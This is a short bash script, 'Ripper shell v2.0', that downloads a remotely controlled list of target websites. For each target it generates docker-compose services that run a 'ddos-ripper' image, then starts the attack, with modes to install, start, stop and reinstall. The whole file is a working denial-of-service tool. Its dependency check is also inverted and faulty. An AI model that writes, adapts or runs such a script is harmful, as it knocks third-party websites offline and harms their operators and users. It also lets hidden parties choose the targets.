#!/bin/bash
# Ripper shell v2.0

VERSION='2.0'
TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'

function print_help {
  echo -e "Usage: os_x_ripper.sh --mode install"
  echo -e "--mode|-m - runmode (install, reinstall, start, stop)"
}

function print_version {
  echo $VERSION
}

function check_dependencies {
  if $(docker -v | grep "Docker"); then
    echo "Please install docker first. https://www.docker.com/products/docker-desktop"
    exit 1
  fi
}

function check_params {
  if [ -z ${MODE+x} ]; then
    echo -e "Mode is unset, please specify correct runmode"
    exit 1
  fi
}

function generate_compose {
    echo -e "version: '3'" > docker-compose.yml
    echo -e "services:" >> docker-compose.yml
    counter=1
    while read -r site_url; do
        if [ ! -z $site_url ]; then
            echo -e "  ddos-runner-$counter:" >> docker-compose.yml
            echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
            echo -e "    restart: always" >> docker-compose.yml
            echo -e "    command: $site_url" >> docker-compose.yml
            ((counter++))
        fi
    done < targets.txt
}

function ripper_start {
  echo "Starting ripper attack"
  docker-compose up -d
}

function ripper_stop {
  echo "Stopping ripper attack"
  docker-compose down
}

while test -n "$1"; do
  case "$1" in
  --help|-h)
    print_help
    exit
    ;;
  --mode|-m)
    MODE=$2
    shift
    ;;
  *)
    echo "Unknown argument: $1"
    print_help
    exit
    ;;
  esac
  shift
done

check_dependencies
check_params

curl --silent $TARGETS_URL --output targets.txt

case $MODE in
  install)
    generate_compose
    ripper_start
    ;;
  start)
    ripper_start
    ;;
  stop)
    ripper_stop
    ;;
  reinstall)
    ripper_stop
    generate_compose
    ripper_start
    ;;
  *)
    echo "Wrong mode"
    exit 1
esac